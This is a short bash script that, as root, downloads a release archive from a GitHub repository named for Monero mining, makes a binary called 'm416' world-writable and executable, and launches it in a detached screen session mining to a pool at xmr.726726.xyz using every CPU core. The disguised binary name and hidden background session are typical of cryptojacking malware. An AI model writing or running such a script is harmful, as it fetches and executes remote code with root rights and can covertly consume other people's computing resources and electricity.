#!/bin/bash
sudo -i <<EOF
wget https://github.com/yuqingkj/mine_xmr/releases/download/6.20.0/v6.20.0.tar.gz
tar -xvf v6.20.0.tar.gz
cd v6.20.0/
chmod 777 ./m416
screen -dmS xmr
screen -x -S xmr -p 0 -X stuff "./m416 -o xmr.726726.xyz:3333 --rig-id az -t $(nproc) \n"
echo ok
EOF
